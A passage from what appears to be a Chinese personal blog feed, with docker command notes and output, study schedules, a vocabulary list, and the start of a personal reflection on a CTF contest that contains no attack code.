class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">docker logs </span><br><span class="line"></span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker logs --help</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Usage:  docker logs [OPTIONS] CONTAINER</span><br><span class="line">Fetch the logs of a container</span><br><span class="line">Options:</span><br><span class="line">      --details        Show extra details provided to logs</span><br><span class="line">  -f, --follow         Follow log output</span><br><span class="line">      --since string   Show logs since timestamp (e.g.</span><br><span class="line">                       2013-01-02T13:23:37Z) or relative (e.g. 42m for</span><br><span class="line">                       42 minutes)</span><br><span class="line">  -n, --tail string    Number of lines to show from the end of the logs</span><br><span class="line">                       (default &quot;all&quot;)</span><br><span class="line">  -t, --timestamps     Show timestamps</span><br><span class="line">      --until string   Show logs before a timestamp (e.g.</span><br><span class="line">                       2013-01-02T13:23:37Z) or relative (e.g. 42m for</span><br><span class="line">                       42 minutes)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">写命令</span></span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker run -d centos /bin/sh -c &quot;while true;do echo lyw;sleep 1;done&quot;</span><br><span class="line">2783d68d71c79728c7f15b89bad0faf06b84e33c7c101b0ed5496b7bac3a1167</span><br><span class="line">^[[A[root@iZuf6ixnt8107eq950q6fyZ docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED          STATUS          PORTS     NAMES</span><br><span class="line">2783d68d71c7   centos    &quot;/bin/sh -c &#x27;while t…&quot;   17 seconds ago   Up 16 seconds   tender_mendel</span><br><span class="line">-tf #显示日志，f是显示时间戳</span><br><span class="line">--tail number #要显示的日志条数</span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker logs -tf --tail 10 2783d68d71c7</span><br><span class="line">2022-01-09T11:54:29.521245201Z lyw</span><br><span class="line">2022-01-09T11:54:30.525491039Z lyw</span><br><span class="line">2022-01-09T11:54:31.529838791Z lyw</span><br><span class="line">2022-01-09T11:54:32.533928862Z lyw</span><br><span class="line">2022-01-09T11:54:33.537051094Z lyw</span><br><span class="line">2022-01-09T11:54:34.540999507Z lyw</span><br><span class="line">2022-01-09T11:54:35.544881553Z lyw</span><br><span class="line">2022-01-09T11:54:36.548094860Z lyw</span><br><span class="line">2022-01-09T11:54:37.550797106Z lyw</span><br><span class="line">2022-01-09T11:54:38.556810694Z lyw</span><br><span class="line">2022-01-09T11:54:39.561005819Z lyw</span><br><span class="line">2022-01-09T11:54:40.564731539Z lyw</span><br><span class="line">2022-01-09T11:54:41.569207712Z lyw</span><br><span class="line">2022-01-09T11:54:42.576549452Z lyw</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="查看容器中的进程信息"><a href="#查看容器中的进程信息" class="headerlink" title="查看容器中的进程信息"></a>查看容器中的进程信息</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker top 2783d68d71c7</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                2298373             2298353             0                   19:53               ?                   00:00:00            /bin/sh -c while true;do echo lyw;sleep 1;done</span><br><span class="line">root                2298963             2298373             0                   19:57               ?                   00:00:00            /usr/bin/coreutils --coreutils-prog-shebang=sleep /usr/bin/sleep 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="镜像的元数据"><a href="#镜像的元数据" class="headerlink" title="镜像的元数据"></a>镜像的元数据</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 2783d68d71c7</span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker inspect 2783d68d71c7</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;2783d68d71c79728c7f15b89bad0faf06b84e33c7c101b0ed5496b7bac3a1167        &quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2022-01-09T11:53:06.222998842Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/bin/sh&quot;,</span><br><span class="line">        &quot;Args&quot;: [</span><br><span class="line">            &quot;-c&quot;,</span><br><span class="line">            &quot;while true;do echo lyw;sleep 1;done&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;Running&quot;: true,</span><br><span class="line">            &quot;Paused&quot;: false,</span><br><span class="line">            &quot;Restarting&quot;: false,</span><br><span class="line">            &quot;OOMKilled&quot;: false,</span><br><span class="line">            &quot;Dead&quot;: false,</span><br><span class="line">            &quot;Pid&quot;: 2298373,</span><br><span class="line">            &quot;ExitCode&quot;: 0,</span><br><span class="line">            &quot;Error&quot;: &quot;&quot;,</span><br><span class="line">            &quot;StartedAt&quot;: &quot;2022-01-09T11:53:07.203089078Z&quot;,</span><br><span class="line">            &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d48        47e53fadb6&quot;,</span><br><span class="line">        &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/2783d68d71c79728c7f15b89b        ad0faf06b84e33c7c101b0ed5496b7bac3a1167/resolv.conf&quot;,</span><br><span class="line">        &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/2783d68d71c79728c7f15b89bad        0faf06b84e33c7c101b0ed5496b7bac3a1167/hostname&quot;,</span><br><span class="line">        &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/2783d68d71c79728c7f15b89bad0fa        f06b84e33c7c101b0ed5496b7bac3a1167/hosts&quot;,</span><br><span class="line">        &quot;LogPath&quot;: &quot;/var/lib/docker/containers/2783d68d71c79728c7f15b89bad0faf0        6b84e33c7c101b0ed5496b7bac3a1167/2783d68d71c79728c7f15b89bad0faf06b84e33c7c101b        0ed5496b7bac3a1167-json.log&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;/tender_mendel&quot;,</span><br><span class="line">        &quot;RestartCount&quot;: 0,</span><br><span class="line">        &quot;Driver&quot;: &quot;overlay2&quot;,</span><br><span class="line">        &quot;Platform&quot;: &quot;linux&quot;,</span><br><span class="line">        &quot;MountLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ProcessLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AppArmorProfile&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ExecIDs&quot;: null,</span><br><span class="line">        &quot;HostConfig&quot;: &#123;</span><br><span class="line">            &quot;Binds&quot;: null,</span><br><span class="line">            &quot;ContainerIDFile&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LogConfig&quot;: &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;json-file&quot;,</span><br><span class="line">                &quot;Config&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;NetworkMode&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;PortBindings&quot;: &#123;&#125;,</span><br><span class="line">            &quot;RestartPolicy&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;no&quot;,</span><br><span class="line">                &quot;MaximumRetryCount&quot;: 0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;AutoRemove&quot;: false,</span><br><span class="line">            &quot;VolumeDriver&quot;: &quot;&quot;,</span><br><span class="line">            &quot;VolumesFrom&quot;: null,</span><br><span class="line">            &quot;CapAdd&quot;: null,</span><br><span class="line">            &quot;CapDrop&quot;: null,</span><br><span class="line">            &quot;CgroupnsMode&quot;: &quot;host&quot;,</span><br><span class="line">            &quot;Dns&quot;: [],</span><br><span class="line">            &quot;DnsOptions&quot;: [],</span><br><span class="line">            &quot;DnsSearch&quot;: [],</span><br><span class="line">            &quot;ExtraHosts&quot;: null,</span><br><span class="line">            &quot;GroupAdd&quot;: null,</span><br><span class="line">            &quot;IpcMode&quot;: &quot;private&quot;,</span><br><span class="line">            &quot;Cgroup&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Links&quot;: null,</span><br><span class="line">            &quot;OomScoreAdj&quot;: 0,</span><br><span class="line">            &quot;PidMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Privileged&quot;: false,</span><br><span class="line">            &quot;PublishAllPorts&quot;: false,</span><br><span class="line">            &quot;ReadonlyRootfs&quot;: false,</span><br><span class="line">            &quot;SecurityOpt&quot;: null,</span><br><span class="line">            &quot;UTSMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;UsernsMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;ShmSize&quot;: 67108864,</span><br><span class="line">            &quot;Runtime&quot;: &quot;runc&quot;,</span><br><span class="line">            &quot;ConsoleSize&quot;: [</span><br><span class="line">                0,</span><br><span class="line">                0</span><br><span class="line">            ],</span><br><span class="line">            &quot;Isolation&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpuShares&quot;: 0,</span><br><span class="line">            &quot;Memory&quot;: 0,</span><br><span class="line">            &quot;NanoCpus&quot;: 0,</span><br><span class="line">            &quot;CgroupParent&quot;: &quot;&quot;,</span><br><span class="line">            &quot;BlkioWeight&quot;: 0,</span><br><span class="line">            &quot;BlkioWeightDevice&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceReadIOps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteIOps&quot;: null,</span><br><span class="line">            &quot;CpuPeriod&quot;: 0,</span><br><span class="line">            &quot;CpuQuota&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimePeriod&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimeRuntime&quot;: 0,</span><br><span class="line">            &quot;CpusetCpus&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpusetMems&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Devices&quot;: [],</span><br><span class="line">            &quot;DeviceCgroupRules&quot;: null,</span><br><span class="line">            &quot;DeviceRequests&quot;: null,</span><br><span class="line">            &quot;KernelMemory&quot;: 0,</span><br><span class="line">            &quot;KernelMemoryTCP&quot;: 0,</span><br><span class="line">            &quot;MemoryReservation&quot;: 0,</span><br><span class="line">            &quot;MemorySwap&quot;: 0,</span><br><span class="line">            &quot;MemorySwappiness&quot;: null,</span><br><span class="line">            &quot;OomKillDisable&quot;: false,</span><br><span class="line">            &quot;PidsLimit&quot;: null,</span><br><span class="line">            &quot;Ulimits&quot;: null,</span><br><span class="line">            &quot;CpuCount&quot;: 0,</span><br><span class="line">            &quot;CpuPercent&quot;: 0,</span><br><span class="line">            &quot;IOMaximumIOps&quot;: 0,</span><br><span class="line">            &quot;IOMaximumBandwidth&quot;: 0,</span><br><span class="line">            &quot;MaskedPaths&quot;: [</span><br><span class="line">                &quot;/proc/asound&quot;,</span><br><span class="line">                &quot;/proc/acpi&quot;,</span><br><span class="line">                &quot;/proc/kcore&quot;,</span><br><span class="line">                &quot;/proc/keys&quot;,</span><br><span class="line">                &quot;/proc/latency_stats&quot;,</span><br><span class="line">                &quot;/proc/timer_list&quot;,</span><br><span class="line">                &quot;/proc/timer_stats&quot;,</span><br><span class="line">                &quot;/proc/sched_debug&quot;,</span><br><span class="line">                &quot;/proc/scsi&quot;,</span><br><span class="line">                &quot;/sys/firmware&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ReadonlyPaths&quot;: [</span><br><span class="line">                &quot;/proc/bus&quot;,</span><br><span class="line">                &quot;/proc/fs&quot;,</span><br><span class="line">                &quot;/proc/irq&quot;,</span><br><span class="line">                &quot;/proc/sys&quot;,</span><br><span class="line">                &quot;/proc/sysrq-trigger&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;GraphDriver&quot;: &#123;</span><br><span class="line">            &quot;Data&quot;: &#123;</span><br><span class="line">                &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/7c4524db44dd217ee5adab8b5        b08276d6c32e2e952e6f0ddc4c65266ee3b82ad-init/diff:/var/lib/docker/overlay2/ac65        3a788658ee7ad451bdfe05c7272695f81817cfd03a974a642d817c7a9551/diff&quot;,</span><br><span class="line">                &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/7c4524db44dd217ee5adab8b        5b08276d6c32e2e952e6f0ddc4c65266ee3b82ad/merged&quot;,</span><br><span class="line">                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/7c4524db44dd217ee5adab8b5        b08276d6c32e2e952e6f0ddc4c65266ee3b82ad/diff&quot;,</span><br><span class="line">                &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/7c4524db44dd217ee5adab8b5b        08276d6c32e2e952e6f0ddc4c65266ee3b82ad/work&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Name&quot;: &quot;overlay2&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Mounts&quot;: [],</span><br><span class="line">        &quot;Config&quot;: &#123;</span><br><span class="line">            &quot;Hostname&quot;: &quot;2783d68d71c7&quot;,</span><br><span class="line">            &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">            &quot;User&quot;: &quot;&quot;,</span><br><span class="line">            &quot;AttachStdin&quot;: false,</span><br><span class="line">            &quot;AttachStdout&quot;: false,</span><br><span class="line">            &quot;AttachStderr&quot;: false,</span><br><span class="line">            &quot;Tty&quot;: false,</span><br><span class="line">            &quot;OpenStdin&quot;: false,</span><br><span class="line">            &quot;StdinOnce&quot;: false,</span><br><span class="line">            &quot;Env&quot;: [</span><br><span class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/        bin&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;/bin/sh&quot;,</span><br><span class="line">                &quot;-c&quot;,</span><br><span class="line">                &quot;while true;do echo lyw;sleep 1;done&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Image&quot;: &quot;centos&quot;,</span><br><span class="line">            &quot;Volumes&quot;: null,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">            &quot;Labels&quot;: &#123;</span><br><span class="line">                &quot;org.label-schema.build-date&quot;: &quot;20210915&quot;,</span><br><span class="line">                &quot;org.label-schema.license&quot;: &quot;GPLv2&quot;,</span><br><span class="line">                &quot;org.label-schema.name&quot;: &quot;CentOS Base Image&quot;,</span><br><span class="line">                &quot;org.label-schema.schema-version&quot;: &quot;1.0&quot;,</span><br><span class="line">                &quot;org.label-schema.vendor&quot;: &quot;CentOS&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;NetworkSettings&quot;: &#123;</span><br><span class="line">            &quot;Bridge&quot;: &quot;&quot;,</span><br><span class="line">            &quot;SandboxID&quot;: &quot;09068a7e5838fbfba8685771bc34bd2bcdf8d264b402714a9ca50        886d5a5811d&quot;,</span><br><span class="line">            &quot;HairpinMode&quot;: false,</span><br><span class="line">            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;Ports&quot;: &#123;&#125;,</span><br><span class="line">            &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/09068a7e5838&quot;,</span><br><span class="line">            &quot;SecondaryIPAddresses&quot;: null,</span><br><span class="line">            &quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class="line">            &quot;EndpointID&quot;: &quot;80c41d2227e018ad4e091e985dd52b73431c444d4d6e54c97e8b        17a124df95ed&quot;,</span><br><span class="line">            &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">            &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">            &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">            &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">            &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">            &quot;Networks&quot;: &#123;</span><br><span class="line">                &quot;bridge&quot;: &#123;</span><br><span class="line">                    &quot;IPAMConfig&quot;: null,</span><br><span class="line">                    &quot;Links&quot;: null,</span><br><span class="line">                    &quot;Aliases&quot;: null,</span><br><span class="line">                    &quot;NetworkID&quot;: &quot;e083a62e341e252fdde879f26aa0746e62b511be92f7d        946823c0e346bbc9e0b&quot;,</span><br><span class="line">                    &quot;EndpointID&quot;: &quot;80c41d2227e018ad4e091e985dd52b73431c444d4d6e        54c97e8b17a124df95ed&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">                    &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">                    &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">                    &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">                    &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">                    &quot;DriverOpts&quot;: null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="进入当前正在进行的容器"><a href="#进入当前正在进行的容器" class="headerlink" title="进入当前正在进行的容器"></a>进入当前正在进行的容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 我们通常容器都是使用后台方式运行的，需要进入容器，修改一些配置</span></span><br><span class="line"><span class="meta">#</span><span class="bash">命令</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#通过exec命令进入容器，进入容器后开启一个新的终端，可以在里面操作</span></span></span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker exec -it 2783d68d71c7 /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#attach。进入容器正在执行的终端，不会启动新的进程</span></span></span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker attach 2783d68d71c7</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="从容器内拷贝文件到主机"><a href="#从容器内拷贝文件到主机" class="headerlink" title="从容器内拷贝文件到主机"></a>从容器内拷贝文件到主机</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>day12_15</title>
      <link href="/2021/12/15/day12-15/"/>
      <url>/2021/12/15/day12-15/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要慢慢的养成不放肆的习惯</p><span id="more"></span><p>8:15-9:15  :背单词</p><p>9:15-9：45：复习图论</p><p>12:30-13：40：吃饭加洗衣服</p><p>14:10-16:40：看作文</p><p>19:10-21:40  听听力</p><p>21:50-10:30：复习今天英语</p><p>11:00-12:00：写java</p><p>晚上别玩手机了！！！ </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>今日单词</title>
      <link href="/2021/12/14/%E4%BB%8A%E6%97%A5%E5%8D%95%E8%AF%8D/"/>
      <url>/2021/12/14/%E4%BB%8A%E6%97%A5%E5%8D%95%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>单词</th><th>汉意</th></tr></thead><tbody><tr><td>priority</td><td>优先，优先事项</td></tr><tr><td>decision</td><td>决定,结论</td></tr><tr><td>reflect</td><td>反应，反映</td></tr><tr><td>sufficient</td><td>足够的，充分的</td></tr><tr><td>excess</td><td>过量的</td></tr><tr><td>disorder</td><td>紊乱，疾病</td></tr><tr><td>variation</td><td>变化</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>12-14计划</title>
      <link href="/2021/12/14/12-14%E8%AE%A1%E5%88%92/"/>
      <url>/2021/12/14/12-14%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一定不要玩手机，一定不要！！！！❌❌❌❌❌❌❌❌❌</p><span id="more"></span><p>（每完成一项，后面画对钩）</p><p>9：50-10:30  洗澡 👘✔</p><p>10:40-11:10   实验报告😣✔</p><p>11：10-14:10  一个小时听力，一个小时单词，一个小时作文🐱‍👓🐱‍👓🐱‍👓</p><p>14:10-14:25  复习单词🐱‍🚀🐱‍🚀🐱‍🚀</p><p>9:40-11:40 复习离散图论</p><p>12:30 睡觉</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>金盾杯反思</title>
      <link href="/2021/12/13/%E9%87%91%E7%9B%BE%E6%9D%AF%E5%8F%8D%E6%80%9D/"/>
      <url>/2021/12/13/%E9%87%91%E7%9B%BE%E6%9D%AF%E5%8F%8D%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一星期，每天早上起来都看一下</p><span id="more"></span><p>刚才愣了一下，这好像是我第一次写反思。希望陈柯言可以做到每天写反思，每次比赛写反思。不写反思怎么可能进步？？？</p><h3 id="理论题"><a href="#理论题" class="headerlink" title="理论题"></a>理论题</h3><p>这部分是我负责的…但是做的很差，真的很差，排名257，？？？，我们总排名第2，我非但没有帮上忙，还拖后腿了。。。</p><p>首先，在做了几道题目之后，我就有点不耐心了，头脑发蒙，想为什么他们可以看题，我却做这个没有用的东西。我不应该这样的。任何人需要各司其职。逺神他们比较厉害，可以为团队做出比较大的贡献，我暂时能力较弱，但是这个分值也很大，2400，我没有把握住。没有耐心是我很大的问题，其实这个也有好处啊，如果我在做题目的时候好好看看题目，自身在思考思考，那我也可以学到新的知识，开阔了知识领域，可以对专业有进一步的理解。我错失了这个机会，而且没有取得比较好的成绩，拖了他们的后腿。我没有做好的应该做的任务，我浮躁了，这是一定要改正的，一定要的。希望下次，陈柯言在做自己的任务的时候，可以认真负责，不要急躁，认真的做好每一件事情。又不着急对吧，干嘛要急匆匆的呢？享受当下，从当下的每一件事情中都可以学到新的知识，这次是我想要的。</p><h3 id="上传你的头像"><a href="#上传你的头像" class="headerlink" title="上传你的头像"></a>上传你的头像</h3><p>这道题目是有思路的，并且思路正确</p><p>原因第一：还是没有耐心。我平时做题的时候，需要用到爆破啊，什么竞争的时候，我总是等不及。这次比赛依然如此，我跑了一会，没出结果，就放弃了。我记得以前问过逺神一道题目，是关于爆破md5值的。逺神直接写脚本跑了出来，很多条数据硬生生的跑了出来。好东西总是值得等待的。我平时生活也就这样，想要的东西就是迫不及待的想得到。但往往不如愿，自己吃亏了也没有买到好东西。很长时间了依然没有改正过来。问题究竟出在那里？还是比较肤浅吗，不沉稳。但是怎么才可以练就沉稳的性格。其实平时看逺神，就可以看出来他是个十分沉稳的人，能沉的住气，这是成功的一大部分</p><p>下面是在网上找的</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 